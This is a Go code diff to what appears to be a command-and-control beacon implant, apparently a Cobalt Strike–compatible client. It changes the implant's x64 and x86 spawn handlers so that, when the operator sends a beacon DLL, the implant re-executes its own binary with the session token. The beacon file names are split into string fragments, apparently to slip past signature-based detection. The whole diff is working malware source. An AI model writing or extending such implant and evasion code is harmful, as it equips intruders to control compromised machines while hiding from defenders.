@@ -7,6 +7,8 @@ import (
 	"main/crypt"
 	"main/packet"
 	"main/services"
+	"os"
+	"strings"
 	"time"
 )
 
@@ -81,10 +83,20 @@ func main() {
 								result, err = services.CmdExit()
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X64:
-								result, err = services.CmdSpawnX64(cmdBuf)
+								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "be"+"ac"+"on.x6"+"4.dll") {
+									filename, _ := os.Executable()
+									result, err = services.CmdExecute([]byte(filename), Token)
+								} else {
+									result, err = services.CmdSpawnX64(cmdBuf)
+								}
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X86:
-								result, err = services.CmdSpawnX86(cmdBuf)
+								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "bea"+"con.d"+"ll") {
+									filename, _ := os.Executable()
+									result, err = services.CmdExecute([]byte(filename), Token)
+								} else {
+									result, err = services.CmdSpawnX86(cmdBuf)
+								}
 								callbackType = 0
 							case packet.CMD_TYPE_EXECUTE:
 								result, err = services.CmdExecute(cmdBuf, Token)
